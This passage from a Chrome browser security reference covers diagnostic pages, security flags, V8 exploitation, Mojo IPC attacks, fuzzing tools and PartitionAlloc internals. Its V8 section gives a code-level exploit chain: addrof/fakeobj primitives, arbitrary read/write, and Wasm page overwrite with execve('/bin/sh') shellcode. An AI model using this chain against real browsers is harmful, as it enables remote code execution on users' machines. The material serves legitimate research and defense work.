| AudioContext output | 5–8 bits |
| Language + locale | 3–5 bits |
| Installed plugins (legacy) | 6–10 bits |
| Hardware concurrency + memory | 3–5 bits |
| Total (combined) | ~33+ bits (sufficient to uniquely identify most users) |

With approximately 33 bits of entropy, an attacker can uniquely identify over 8 billion distinct configurations — more than the world's population. In practice, the top 20 fingerprinting vectors combined uniquely identify approximately 94% of desktop browser instances (per EFF's Panopticlick/Cover Your Tracks research).

---

## 15. Browser security diagnostics and configuration

### 15.1 Chrome internal pages for security audit

- `chrome://process-internals/` — shows all active processes, their types, site instances, and associated origins. Verifies site isolation is working correctly.
- `chrome://sandbox/` — displays sandbox policy for each process type. Shows seccomp-BPF filter status on Linux, sandbox profile on macOS, restricted token details on Windows.
- `chrome://flags/` — experimental features including security-related flags.
- `chrome://net-internals/` — network stack diagnostics: DNS, sockets, HSTS state, CORS/CORB logs.
- `chrome://histograms/` — UMA histograms including V8 deopt counters, security-relevant metrics.
- `chrome://crashes/` — crash reports (useful for detecting exploitation attempts).
- `chrome://site-engagement/` — per-site engagement scores (affects Permission UI).
- `chrome://policy/` — active enterprise policies including extension restrictions.
- `chrome://safe-browsing/` — Safe Browsing status and threat database details.

### 15.2 Security-relevant chrome://flags

| Flag | Effect |
|------|--------|
| `#enable-v8-sandbox` | V8 heap sandbox (default on 64-bit) |
| `#origin-agent-cluster-default` | Per-origin process isolation by default |
| `#enable-webrtc-hide-local-ips-with-mdns` | Replace local IPs with mDNS in WebRTC |
| `#strict-origin-isolation` | Strict origin-based site isolation |
| `#block-insecure-private-network-requests` | Block HTTP requests to private network from HTTPS pages |
| `#cors-for-content-scripts` | Enforce CORS on extension content script requests |
| `#enable-isolated-web-apps` | Isolated Web Apps (stricter-than-web security model) |
| `#enable-fenced-frames` | Fenced frames for Privacy Sandbox |

### 15.3 DevTools security features

- **Security panel.** Shows certificate details, connection security (TLS version, cipher suite), and mixed content warnings for the inspected page.
- **Application panel → Service Workers.** Lists registered Service Workers with their scope and status. Critical for detecting malicious persistent Service Workers.
- **Application panel → Cookies.** Shows all cookies with attributes (Secure, HttpOnly, SameSite, Partitioned). Identifies cookies missing security attributes.
- **Network panel → Headers.** Inspect CSP, COOP, COEP, CORP, and other security headers on responses.
- **Network panel → Blocked requests.** Shows requests blocked by CORB/ORB, mixed content policy, or CSP.
- **Console panel.** CSP violation reports, mixed content warnings, and deprecated API usage warnings appear here.
- **Lighthouse → Security audit.** Automated checks for HTTPS, mixed content, vulnerable JS libraries, and security headers.

---

## 16. V8 type confusion exploitation — full primitive chain

This section walks through the canonical V8 type-confusion-to-shellcode pipeline in concrete detail, expanding on the conceptual overview in §3.3.

### 16.1 Map transition type confusion

V8's Maps encode an object's exact structural layout — property names, offsets, and element types. TurboFan speculates on Map stability during optimization: if a function always receives objects with Map `M`, TurboFan generates fast-path code that accesses properties at offsets hardcoded for `M`. A type confusion arises when TurboFan's speculation is invalidated at runtime — the object's Map has transitioned — but the deoptimization guard that should catch the mismatch was removed by an incorrect optimization pass.

The attacker's goal is to confuse two Maps whose memory layouts differ in a security-critical way. The classic pair: a `PACKED_DOUBLE_ELEMENTS` array (elements stored as raw IEEE 754 doubles, 8 bytes each, no tagging) versus a `PACKED_ELEMENTS` array (elements stored as tagged pointers, where each slot is either a Smi or a heap pointer). If TurboFan emits code that reads a `PACKED_ELEMENTS` slot but the array has been switched to `PACKED_DOUBLE_ELEMENTS` (or vice versa), a pointer is interpreted as a float or a float is interpreted as a pointer.

### 16.2 Building `addrof` — leak any object's heap address

`addrof` exploits a confusion where the JIT reads a tagged pointer (object reference) as if it were a raw double. The returned float64 encodes the pointer bits.

```javascript
// CVE-style addrof primitive (simplified, assumes a V8 Typer/BCE bug)
// Setup: two arrays with different element kinds
var float_arr = [1.1, 2.2, 3.3];          // PACKED_DOUBLE_ELEMENTS
var obj_arr   = [{}];                       // PACKED_ELEMENTS

// Map confusion trigger function — exact shape depends on the CVE
// The function is compiled by TurboFan under the assumption
// that arr is always PACKED_DOUBLE_ELEMENTS
function confused_read(arr, idx) {
  // BUG: TurboFan omits the elements-kind check after a flawed
  // redundancy-elimination pass.  At runtime the caller passes
  // obj_arr (PACKED_ELEMENTS), but TurboFan reads the slot as
  // a raw float64.
  return arr[idx];
}

// Warm up — train TurboFan with the double array
for (var i = 0; i < 100000; i++) confused_read(float_arr, 0);

// Trigger — pass the object array instead
obj_arr[0] = target_object;  // place the target in slot 0
var leaked = confused_read(obj_arr, 0);

// leaked is a float64 whose bits encode target_object's heap address.
// Convert float64 bits to BigInt for address arithmetic:
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u64 = new BigInt64Array(buf);
f64[0] = leaked;
var addr = u64[0];
// addr is now the compressed (or full) heap pointer of target_object
```

In V8's pointer compression scheme (64-bit platforms), heap pointers are 32-bit offsets from a cage base. `addrof` leaks this 32-bit compressed pointer. The cage base itself is constant within the V8 isolate and can be inferred from known object addresses.

### 16.3 Building `fakeobj` — instantiate a fake object at a chosen address

`fakeobj` is the dual: write an attacker-controlled float64 into a slot that TurboFan reads as a tagged pointer (object reference).

```javascript
// fakeobj primitive — dual of addrof
// Uses the same TurboFan bug in the reverse direction
function confused_write(arr, idx, val) {
  // BUG: TurboFan writes val as a raw double into what is actually
  // a PACKED_ELEMENTS slot, creating a tagged pointer from
  // attacker-controlled bits.
  arr[idx] = val;
}

// Warm up with the double array
for (var i = 0; i < 100000; i++) confused_write(float_arr, 0, 4.4);

// Encode the target address as a float64
var target_addr = 0x12345678n;  // address of attacker-controlled data
u64[0] = target_addr;
var addr_as_float = f64[0];

// Trigger: write into the object array — V8 treats the float bits
// as a tagged pointer
confused_write(obj_arr, 0, addr_as_float);

// obj_arr[0] is now a JavaScript object "at" target_addr
var fake = obj_arr[0];
```

The attacker must ensure that `target_addr` points to memory containing a valid V8 object layout (Map pointer, elements pointer, length) that they control. Typically this is placed inside a known `ArrayBuffer`'s backing store (whose address was leaked via `addrof`).

### 16.4 Arbitrary read/write from addrof + fakeobj

With both primitives, the attacker constructs a fake `ArrayBuffer` or `JSTypedArray` whose `backing_store` field points to an arbitrary address. Reading and writing through this typed array provides full process-memory access.

```javascript
// Step 1: Craft a fake JSArray with PACKED_DOUBLE_ELEMENTS in a
// known ArrayBuffer.  The layout must match V8's internal object
// representation exactly.
//
// V8 JSArray layout (simplified, 64-bit compressed pointers):
//   +0x00  Map pointer          (tagged, 4 bytes compressed)
//   +0x04  Properties pointer   (tagged, 4 bytes)
//   +0x08  Elements pointer     (tagged, 4 bytes — points to FixedDoubleArray)
//   +0x0C  Length               (Smi, 4 bytes)
//
// FixedDoubleArray layout:
//   +0x00  Map pointer (Map for FixedDoubleArray)
//   +0x04  Length (Smi)
//   +0x08  Element 0 (raw double, 8 bytes)
//   +0x10  Element 1 (raw double, 8 bytes)
//   ...

// Place the fake object data inside a DataView-backed ArrayBuffer
var fake_buf = new ArrayBuffer(0x100);
var dv = new DataView(fake_buf);

// Leak addresses we need
var float_arr_addr  = addrof(float_arr);
var float_arr_map   = read32(float_arr_addr + 0x00n); // Map of PACKED_DOUBLE_ELEMENTS array
var float_arr_elems = read32(float_arr_addr + 0x08n); // its FixedDoubleArray

// Write the fake JSArray header into fake_buf
var fake_buf_addr = addrof(fake_buf);
var fake_buf_backing = get_backing_store(fake_buf_addr); // backing store address

// Place fake FixedDoubleArray header
dv.setUint32(0x00, fixedDoubleArrayMap, true);  // Map for FixedDoubleArray
dv.setUint32(0x04, smi(0x1000), true);          // large length — enables OOB access
// Element data starts at offset 0x08

// Place fake JSArray header at offset 0x40
dv.setUint32(0x40, float_arr_map, true);        // Map (PACKED_DOUBLE_ELEMENTS)
dv.setUint32(0x44, emptyFixedArray, true);       // properties (empty)
dv.setUint32(0x48, compress(fake_buf_backing), true); // elements → our fake FixedDoubleArray
dv.setUint32(0x4C, smi(0x1000), true);          // length

// Create the fake JSArray via fakeobj
var arb_rw = fakeobj(fake_buf_backing + 0x40n);

// arb_rw is a JSArray whose elements pointer is our fake FixedDoubleArray
// with an inflated length.  arb_rw[N] accesses (fake_elements_addr + 8 + N*8)
// — reading/writing arbitrary contiguous memory as float64 values.
```

### 16.5 Wasm RWX page shellcode injection

WebAssembly modules are JIT-compiled to native code. On platforms without W^X enforcement for Wasm (or where `mprotect` is reachable), the compiled Wasm code resides in RWX memory pages. The attacker uses arbitrary write to overwrite the Wasm code region with shellcode.

```javascript
// Step 1: Create a trivial Wasm module — its compiled code lives
// in a JIT page.
var wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d,  // magic: \0asm
  0x01, 0x00, 0x00, 0x00,  // version 1
  // Type section: one function type () -> ()
  0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
  // Function section: function 0 has type 0
  0x03, 0x02, 0x01, 0x00,
  // Export section: export "main" = function 0
  0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
  // Code section: function body is a single nop + end
  0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_inst = new WebAssembly.Instance(wasm_mod);
var wasm_func = wasm_inst.exports.main;

// Step 2: Locate the JIT code page.
// The WasmInstanceObject has a field (jump_table_start or similar)
// pointing to the compiled code.  Use addrof + arbitrary read to
// walk: wasm_inst → WasmInstanceObject → jump_table_start.
var wasm_inst_addr = addrof(wasm_inst);
// Read the internal WasmInstanceData pointer (offset varies by V8 version)
var instance_data = arb_read64(wasm_inst_addr + WASM_INSTANCE_DATA_OFFSET);
// Read the jump_table_start field
var rwx_addr = arb_read64(instance_data + JUMP_TABLE_START_OFFSET);

// Step 3: Write shellcode over the Wasm code page.
// Example: Linux x86-64 execve("/bin/sh") shellcode
var shellcode = new Uint8Array([
  0x48, 0x31, 0xf6,                          // xor rsi, rsi
  0x56,                                        // push rsi
  0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,        // movabs rdi, "/bin/sh\0"
  0x2f, 0x73, 0x68, 0x00,
  0x57,                                        // push rdi
  0x48, 0x89, 0xe7,                            // mov rdi, rsp
  0x48, 0x31, 0xd2,                            // xor rdx, rdx
  0xb0, 0x3b,                                  // mov al, 59 (sys_execve)
  0x0f, 0x05                                   // syscall
]);

// Copy shellcode to the RWX page via arbitrary write
for (var i = 0; i < shellcode.length; i++) {
  arb_write8(rwx_addr + BigInt(i), shellcode[i]);
}

// Step 4: Trigger — call the Wasm function, which now jumps to shellcode
wasm_func();  // execve("/bin/sh")
```

On modern Chrome (W^X for Wasm JIT pages), the Wasm code page is mapped RX after compilation. The attacker must either: (a) find a window during compilation where the page is RW, (b) use `mprotect` via a ROP chain to flip the permissions, or (c) corrupt the V8 code pointer table to redirect a function call to a different executable region.

### 16.6 V8 heap sandbox bypass overview

The V8 sandbox (§3.4) confines most external pointers behind the External Pointer Table (EPT). To escape the V8 heap sandbox, an attacker with arbitrary R/W within the V8 heap must:

1. **Corrupt EPT entries.** The EPT resides in a separate memory region. If the attacker can compute its address (it is at a fixed offset from the V8 cage base on some versions), they can overwrite entries to redirect an external pointer to an arbitrary address. V8 mitigates this by tagging entries and checking tags on access.

2. **Abuse the Code Pointer Table (CPT).** JIT code pointers go through a separate table (the Code Pointer Table). Corrupting a CPT entry redirects the next call to JIT-compiled code to an attacker-controlled address. V8 validates that CPT entries point within the code space, but implementation gaps can be exploited.

3. **Abuse Trusted Pointer Table (TPT).** The TPT stores pointers to trusted V8 internal objects (contexts, scopes). Corrupting a TPT entry can give the attacker a fake context object with controlled fields, leading to arbitrary external pointer creation.

4. **Wasm jump table corruption.** Even inside the sandbox, the Wasm jump table base can sometimes be reached. Overwriting a jump table entry redirects a Wasm `call_indirect` to attacker-controlled code.

The V8 sandbox is actively evolving. As of Chrome 128+, the EPT and CPT are allocated in separate regions with guard pages, and new table entry types are progressively hardened. The sandbox raises the bar significantly — exploit chains now require a V8 sandbox bypass as a distinct step between renderer RCE and arbitrary native code execution.

### 16.7 CVE-2020-6418 walkthrough — incorrect side-effect modeling

CVE-2020-6418 (reported by Clement Lecigne of Google TAG, February 2020) is a canonical V8 type confusion caused by TurboFan's incorrect side-effect modeling.

**Root cause.** The `JSCreate` operation (constructing an object via `new`) was not correctly modeled as having side effects. TurboFan's `LoadElimination` pass assumed that a `JSCreate` call could not cause the receiver's Map to change. In reality, the constructor could trigger a Map transition (e.g., by adding properties to the object). Because `LoadElimination` eliminated a redundant Map check after the `JSCreate`, the generated code accessed the object with a stale Map assumption.

**Trigger pattern (simplified):**

```javascript
function vuln(x) {
  // Phase 1: TurboFan sees x.a and records x's Map
  let v = x.a;

  // Phase 2: JSCreate triggers a constructor that transitions x's Map
  // TurboFan's LoadElimination incorrectly assumes x's Map is unchanged
  let obj = new SomeConstructor();

  // Phase 3: Access x.b using the OLD Map's offset for property 'b'
  // But x's Map has transitioned — 'b' is now at a different offset
  // (or does not exist), causing a type confusion read
  return x.b;
}

// SomeConstructor's body modifies x (via a captured closure reference)
// causing x's Map to transition between Phase 1 and Phase 3
```

**Exploitation.** The type confusion allowed reading a property at the wrong offset, which an attacker could arrange to overlap with an object pointer or a length field. From there, the standard addrof/fakeobj/arb-RW/shellcode chain applied. The bug was exploited in the wild against real targets. Patch: `https://chromium.googlesource.com/v8/v8/+/c37aabc` — marking `JSCreate` as potentially having side effects on the receiver's Map.

**CVSS:** 8.8 (High). **CWE:** CWE-843 (Access of Resource Using Incompatible Type).

---

## 17. Mojo IPC exploitation — deep dive

Expanding on §7.3, this section covers Mojo exploitation from the perspective of a compromised renderer process.

### 17.1 Interface enumeration from a compromised renderer

After achieving code execution in the renderer, the attacker controls V8 and Blink. The next step is enumerating which Mojo interfaces the renderer can bind to the browser process. The renderer requests interfaces through `BrowserInterfaceBroker`:

```cpp
// From a compromised renderer, the attacker can call:
// content::RenderFrameImpl::GetBrowserInterfaceBroker()
// to obtain a mojo::PendingReceiver<blink::mojom::BrowserInterfaceBroker>

// Enumerate by attempting to bind known interface names:
// - blink::mojom::BlobRegistry
// - blink::mojom::CodeCacheHost
// - network::mojom::RestrictedCookieManager
// - blink::mojom::FileSystemManager
// - device::mojom::SensorProvider
// - blink::mojom::LockManager
// - blink::mojom::PermissionService
// - content::mojom::RendererHost
// - blink::mojom::WebUsbService
// - blink::mojom::WebBluetoothService
```

The attacker iterates over known `.mojom` interface names (extracted from Chromium source). A successful bind means the interface is available. Interfaces intended only for WebUI contexts (e.g., `chrome://settings` pages) should be rejected by the broker for web content frames. Interface exposure bugs occur when the broker fails to restrict an interface to its intended context.

**Methodology:**
1. Build a list of all `.mojom` files in the Chromium source tree: `find src/third_party/blink/public/mojom -name "*.mojom" | wc -l` yields 200+ interfaces.
2. For each interface, attempt `GetInterface()` through the `BrowserInterfaceBroker`.
3. Log which interfaces bind successfully from a web content renderer versus a WebUI renderer.
4. Any interface available to web content that performs privileged operations (file I/O, process spawning, credential access) is a potential sandbox escape vector.

### 17.2 Crafting malformed Mojo messages

Mojo serialization enforces type safety, but the browser-side handler implementation may have vulnerabilities:

**Integer overflow in size parameters.** A Mojo method that accepts a `uint32` length and uses it to allocate a buffer: if the handler computes `length * element_size` without overflow checking, the allocation is smaller than expected, and a subsequent copy overwrites adjacent heap data.

```cpp
// Vulnerable browser-side handler (illustrative)
void BlobRegistryImpl::Register(
    mojo::PendingReceiver<blink::mojom::Blob> blob,
    const std::string& uuid,
    const std::string& content_type,
    const std::string& content_disposition,
    std::vector<blink::mojom::DataElementPtr> elements) {

  // BUG: total_size overflow when summing element lengths
  uint32_t total_size = 0;
  for (auto& el : elements) {
    total_size += el->length;  // integer overflow if sum > UINT32_MAX
  }
  auto buffer = std::make_unique<char[]>(total_size);  // undersized
  // ... copy element data into buffer → heap overflow
}
```

**Type confusion via union variants.** Mojo unions (discriminated unions in `.mojom`) can be abused if the handler does not check the active variant before accessing data. Sending a union with an unexpected variant tag can cause the handler to interpret data as the wrong type.

**String/buffer length mismatches.** Mojo strings are length-prefixed. The attacker can craft a message where the declared length exceeds the actual data, causing the handler to read beyond the message buffer (information leak) or use uninitialized memory.

### 17.3 Race conditions in browser-side handlers

TOCTOU (time-of-check-time-of-use) races are a critical bug class in Mojo handlers:

```
Renderer                                  Browser process
  |                                           |
  |-- PermissionService::HasPermission() ---->|
  |                                           | checks: origin has geolocation? YES
  |                                           |
  |-- (rapidly) revoke own permission ------->| (permission update processed)
  |                                           |
  |<---- HasPermission result: GRANTED -------|
  |                                           |
  |-- SensorProvider::GetSensor() ----------->|
  |                                           | uses cached permission check → ALLOWED
  |                                           | (but permission was revoked!)
```

Exploitable races arise when:
1. A permission check and the privileged action are separate Mojo calls.
2. The browser caches a security decision that the renderer can subsequently invalidate.
3. Multiple Mojo interfaces interact: the renderer uses Interface A to change state, then Interface B's handler reads the stale state.

**Mitigation pattern.** Re-check permissions atomically at the point of the privileged action, not in a separate preceding call. Use `base::SequencedTaskRunner` to serialize access to shared state.

### 17.4 BrowserInterfaceBroker audit methodology

Auditing Mojo interfaces for sandbox escape:

1. **Map the attack surface.** Extract all interfaces registered in `BrowserInterfaceBrokerImpl::GetInterface()` and `PopulateFrameBinders()` (`content/browser/browser_interface_binders.cc`). Cross-reference with the frame type (web content, extension, WebUI, Service Worker).

2. **Identify privileged operations.** For each interface reachable from web content, determine what privileged operations the browser-side handler performs: file reads/writes, process creation, clipboard access, credential store access, DOM access in other frames, permission grants.

3. **Input validation audit.** For each method on reachable interfaces, verify:
   - All size/length parameters are bounds-checked.
   - All pointers/handles received from the renderer are validated before use.
   - No assumption about message ordering (the renderer can send messages in any order).
   - No assumption about message timing (the renderer can delay responses arbitrarily).

4. **Race condition review.** Identify any handler that checks a condition, then acts on it in a subsequent step. Look for shared state between Mojo handlers on different interfaces.

5. **Fuzz the interface.** Use Mojo fuzzer infrastructure (`mojo_fuzzer_*` targets in `testing/libfuzzer/`) or custom fuzzers that generate random Mojo messages for the target interface.

### 17.5 Real sandbox escape examples via Mojo

**CVE-2019-13768 (FileSystemManager sandbox escape).** The `FileSystemManager` Mojo interface allowed a compromised renderer to request file operations. A logic bug in path validation allowed the renderer to escape the sandboxed file system and access arbitrary files in the browser process context. Combined with a renderer exploit, this achieved full file system access.

**CVE-2020-6418 chain.** While CVE-2020-6418 itself was the V8 bug, the full exploit chain used a Mojo interface vulnerability to escalate from renderer RCE to browser process code execution. The specifics remain partially undisclosed due to active exploitation.

**Issue 1062091 (BlobRegistry URL spoofing).** A compromised renderer could register blob URLs with spoofed origins through the BlobRegistry Mojo interface, allowing cross-origin data access. The browser-side handler did not validate that the registering renderer had authority over the claimed origin.

**CVE-2021-21220 (V8 + Mojo chain, Pwn2Own 2021).** A V8 type confusion (incorrect JIT code generated for x86-64 XOR operations) provided renderer RCE. The sandbox escape exploited a Mojo interface bug where the browser process trusted renderer-provided handles without validation. Full chain: V8 RCE → Mojo sandbox escape → OS-level code execution.

---

## 18. Browser fuzzing tools

Fuzzing is the primary technique for discovering browser vulnerabilities. The major browser vendors and Project Zero maintain dedicated fuzzing infrastructure.

### 18.1 Domato — DOM/rendering fuzzer

Domato is Google Project Zero's grammar-based fuzzer targeting browser DOM and rendering engines. It generates syntactically valid HTML/CSS/JavaScript that exercises DOM manipulation, layout, painting, and SVG processing.

**Setup:**

```bash
git clone https://github.com/googleprojectzero/domato.git
cd domato

# Generate a single HTML test case
python3 generator.py --output testcase.html

# Generate 1000 test cases
for i in $(seq 1 1000); do
  python3 generator.py --output "corpus/test_${i}.html"
done

# Run against Chrome with ASan build
./chrome-asan --disable-gpu --no-sandbox \
  --user-data-dir=/tmp/chrome-fuzz \
  "file:///path/to/corpus/test_1.html"
```

**Grammar structure.** Domato uses context-free grammars defined in `.txt` files:
- `html.txt` — HTML element generation rules
- `css.txt` — CSS property/value generation
- `js.txt` — JavaScript DOM manipulation

Each grammar rule specifies production alternatives with type annotations. Domato concatenates HTML structure, CSS styling, and JavaScript DOM operations into a single test case. The JavaScript portion performs random DOM mutations (creating, removing, moving, cloning nodes; changing attributes; forcing layout) designed to trigger UAF, type confusion, and OOB bugs in the rendering engine.

**Results.** Domato has found dozens of high-severity browser bugs across all major engines. Ivan Fratric's 2017 disclosure alone reported 31 bugs across Chrome, Firefox, Safari, and Edge.

### 18.2 Fuzzilli — JavaScript engine fuzzer

Fuzzilli (by Samuel Gross, Project Zero / Google) is a coverage-guided fuzzer targeting JavaScript engines (V8, SpiderMonkey, JavaScriptCore).

**Architecture.** Fuzzilli operates on a custom intermediate representation called **FuzzIL** — a typed, SSA-based IR that represents JavaScript programs. Mutations operate on FuzzIL (inserting, removing, mutating instructions) and the result is "lifted" back to JavaScript for execution. This avoids generating syntactically invalid JavaScript and focuses mutations on semantically interesting variations.

**Key features:**
- **Coverage-guided.** Uses edge coverage (instrumented via LLVM SanitizerCoverage) to prioritize inputs that explore new code paths.
- **Distributed.** Supports multiple fuzzer instances sharing a corpus over the network.
- **Engine-aware.** Understands JavaScript semantics: variable scoping, type system, built-in objects.
- **Minimizer.** Automatically reduces crashing inputs to minimal reproducers.

**Setup (V8 target):**

```bash
# Build V8 with coverage instrumentation
cd v8
tools/dev/gm.py x64.release
# Build with -fsanitize-coverage=trace-pc-guard
gn gen out/fuzz --args='is_debug=false v8_enable_sandbox=true \
  use_custom_libcxx=false sanitizer_coverage_flags="trace-pc-guard"'
ninja -C out/fuzz d8

# Build Fuzzilli
git clone https://github.com/googleprojectzero/fuzzilli.git
cd fuzzilli
swift build -c release

# Run Fuzzilli against V8
.build/release/FuzzilliCli \
  --storagePath=/tmp/fuzzilli-v8 \
  --profile=v8 \
  /path/to/v8/out/fuzz/d8
```

**FuzzIL example (internal representation):**

```
v0 <- LoadBuiltin 'Array'
v1 <- LoadInt 100
v2 <- Construct v0, [v1]         // new Array(100)
v3 <- LoadInt 0
v4 <- LoadFloat 1.1
StoreElement v2, v3, v4           // arr[0] = 1.1
v5 <- LoadInt 1
v6 <- LoadBuiltin 'Object'
v7 <- Construct v6, []            // new Object()
StoreElement v2, v5, v7           // arr[1] = {} — forces elements transition
v8 <- LoadElement v2, v3          // arr[0] — may trigger type confusion
```

### 18.3 ClusterFuzz and OSS-Fuzz

**ClusterFuzz** is Google's distributed fuzzing infrastructure. Chrome's continuous fuzzing runs on thousands of cores, executing billions of test cases daily. ClusterFuzz manages corpus, deduplicates crashes, bisects regressions, and files bugs automatically.

**OSS-Fuzz** extends ClusterFuzz to open-source projects (including Chromium dependencies: libpng, libwebp, freetype, ICU, zlib, harfbuzz). Over 1000 projects are enrolled. OSS-Fuzz has found 10000+ vulnerabilities across enrolled projects.

**Integration with Chromium:**
- Fuzz targets are defined in `testing/libfuzzer/` and `testing/fuzzer/`.
- Each target is a C++ function: `extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size)`.
- Targets exercise specific Chromium subsystems: Mojo deserializers, image decoders, HTML parser, CSS parser, URL parser.

### 18.4 ASan/MSan/TSan builds for bug hunting

Sanitizer builds instrument Chromium to detect memory errors at runtime:

| Sanitizer | Detects | Build flag | Overhead |
|-----------|---------|------------|----------|
| **ASan** (AddressSanitizer) | Heap/stack buffer overflows, UAF, double-free, memory leaks | `is_asan=true` | 2x slowdown, 2-3x memory |
| **MSan** (MemorySanitizer) | Uninitialized memory reads | `is_msan=true` | 3x slowdown |
| **TSan** (ThreadSanitizer) | Data races, deadlocks | `is_tsan=true` | 5-15x slowdown, 5-10x memory |
| **UBSan** (UndefinedBehaviorSanitizer) | Integer overflow, null deref, alignment | `is_ubsan=true` | 1.5x slowdown |
| **CFI** (Control Flow Integrity) | Indirect call target validation | `is_cfi=true` | <5% slowdown |

**Building Chromium with ASan:**

```bash
gn gen out/asan --args='
  is_asan=true
  is_debug=false
  symbol_level=1
  is_component_build=false
  dcheck_always_on=true
'
autoninja -C out/asan chrome
```

**Triaging ASan reports.** ASan reports include the full stack trace of the invalid access and the stack trace of the allocation/deallocation. For UAF bugs, the deallocation trace reveals where the object was freed, and the access trace shows the use-after-free site. The two traces together identify the bug pattern.

### 18.5 Fuzzer comparison

| Tool | Target | Technique | Guidance | Engines | Notable finds |
|------|--------|-----------|----------|---------|--------------|
| **Domato** | DOM/rendering | Grammar-based | None (generative) | All browsers | 31 bugs in 2017 disclosure |
| **Fuzzilli** | JS engines | FuzzIL mutation | Coverage-guided | V8, SM, JSC | 100+ V8/JSC/SM bugs |
| **ClusterFuzz** | All Chromium | Multi-strategy | Coverage-guided | Chrome | Thousands of bugs |
| **jsfunfuzz** | JS engines | Grammar-based | None | SpiderMonkey, V8 | Hundreds of SM bugs |
| **Dharma** | Browsers | Grammar-based | None | All | MathML/SVG bugs |
| **Jackalope** | Binaries | Black-box mutational | Coverage (DynamoRIO) | Any native target | Library-level bugs |

---

## 19. PartitionAlloc and MiraclePtr deep dive

PartitionAlloc is Chromium's heap allocator (default since Chrome 83), designed with security as a primary goal. Understanding its internals is essential for exploit development and defense.

### 19.1 Bucket structure and slot span layout

PartitionAlloc divides the heap into **partitions** — separate heaps for different object types. Each partition contains **buckets** — size classes for allocations. Each bucket manages **slot spans** — contiguous memory regions subdivided into equal-sized **slots**.

```
Partition (e.g., "Blink DOM objects")
 └── Bucket (size class: 64 bytes)
      ├── SlotSpan 0: [slot0][slot1][slot2]...[slotN]  (one or more OS pages)
      ├── SlotSpan 1: [slot0][slot1]...[slotN]
      └── ...
 └── Bucket (size class: 128 bytes)
      ├── SlotSpan 0: ...
      └── ...
```

**Size classes.** PartitionAlloc uses power-of-two size classes with intermediate sizes: 16, 32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256, ... up to a direct-map threshold (approximately 1 MB, above which allocations get their own virtual memory region). Each allocation is rounded up to the next size class. Wasted space (internal fragmentation) is bounded by the size class granularity.

**Freelist encoding.** Free slots are linked into a per-slot-span freelist. The next-free pointer is stored at the beginning of each free slot, XOR-encoded with a per-partition random cookie and the slot's address:

```
encoded_next = raw_next XOR partition_cookie XOR slot_address
```

This prevents a linear heap overflow from trivially overwriting a freelist pointer to redirect allocations. An attacker must know the partition cookie and the slot address to craft a valid encoded pointer. The cookie is randomized at partition creation time.

**Guard pages.** PartitionAlloc inserts guard pages between slot spans and at partition boundaries. A linear overflow from one slot span into the next hits a guard page and crashes, preventing silent corruption of adjacent allocations.

**Zeroing.** Freed memory is zeroed before returning to the freelist. This prevents dangling-pointer reads from recovering stale data (pointers, vtables, sensitive values).

### 19.2 MiraclePtr quarantine mechanism

MiraclePtr (BackupRefPtr / `raw_ptr<T>`) is a smart pointer that detects use-after-free at runtime. When enabled, `raw_ptr<T>` adds a reference count to the allocation's metadata. When the allocation is freed but references remain, the memory is placed in a **quarantine** instead of being returned to the freelist.

**Quarantine behavior:**

1. Object is freed via `delete` or `free()`.
2. PartitionAlloc checks the BackupRefPtr reference count.
3. If refcount > 0 (dangling pointers exist), the slot is quarantined:
   - The slot's memory is zeroed (preventing information leaks).
   - The slot is NOT placed on the freelist (preventing reallocation).
   - The slot remains quarantined until all `raw_ptr<T>` references are destroyed.
4. When the last `raw_ptr<T>` to the quarantined slot is destroyed, the slot is returned to the freelist.

**Security impact.** An attacker who triggers a UAF on a MiraclePtr-protected pointer gets zeroed memory instead of attacker-controlled data. The UAF is detected (in debug builds, a crash is triggered; in release builds, the zeroed memory prevents exploitation but may cause a different crash or silent failure).

**Coverage.** As of 2024, approximately 60% of raw pointers in the browser process are protected by MiraclePtr. The renderer process has lower coverage due to Blink's use of custom garbage collection (`Oilpan`). Ongoing work extends MiraclePtr to more pointer sites, with the goal of protecting all C++ pointers in the browser process.

### 19.3 Cross-partition spraying limitations

PartitionAlloc's partition separation defeats many traditional heap spraying techniques:

- **DOM objects** are allocated in the Blink partition.
- **ArrayBuffer backing stores** are allocated in the buffer partition.
- **Strings** are in the string partition.
- **V8 heap objects** are managed by V8's own allocator (Oilpan for Blink-side, V8's GC heap for JS-side).

An attacker who frees a DOM object cannot replace it with an ArrayBuffer backing store — they are in different partitions. The attacker must find a same-partition, same-size-class allocation to fill the freed slot. This constrains the set of "spraying" objects available for exploitation.

**Bypass techniques:**
- **Same-partition objects.** Find an object in the same partition with the same size class that has attacker-controlled fields at security-critical offsets (vtable pointer, length field).
- **Over-allocation.** Allocate many objects of the target size class to force the partition to expand, then free a controlled subset to arrange the freelist predictably.
- **PartitionAlloc metadata corruption.** If the attacker can overflow into PartitionAlloc's per-slot-span metadata (stored in a separate "metadata" partition), they can corrupt the freelist or bucket pointers. Guard pages mitigate this.

### 19.4 V8 heap sandbox — memory cage and pointer tables

The V8 heap sandbox (also called the V8 memory cage) confines the V8 managed heap to a pre-allocated virtual address range (the "cage"). All V8 heap pointers are offsets within this cage.

**Memory cage layout:**

```
[V8 cage base]
  +0x0000_0000_0000  Cage start (guard pages)
  +0x0000_0001_0000  V8 heap region (new space, old space, code space, etc.)
  ...
  +0x0000_XXXX_XXXX  External Pointer Table (EPT)
  +0x0000_YYYY_YYYY  Code Pointer Table (CPT)
  +0x0000_ZZZZ_ZZZZ  Trusted Pointer Table (TPT)
  +0x0001_0000_0000  Cage end (guard pages)   // 4 GB cage on 64-bit
```

**External Pointer Table (EPT).** V8 heap objects store 32-bit indices instead of raw external pointers. Each EPT entry is a 64-bit value:

```
EPT entry: [pointer (48 bits)] | [tag (16 bits)]
```

The tag encodes the expected type (e.g., `kArrayBufferBackingStoreTag`, `kExternalStringResourceTag`). When V8 dereferences an external pointer, it reads the EPT entry, checks the tag against the expected type, and extracts the pointer. A type-confused V8 object that uses the wrong EPT index gets an entry with a mismatched tag, which triggers a crash instead of allowing arbitrary dereference.

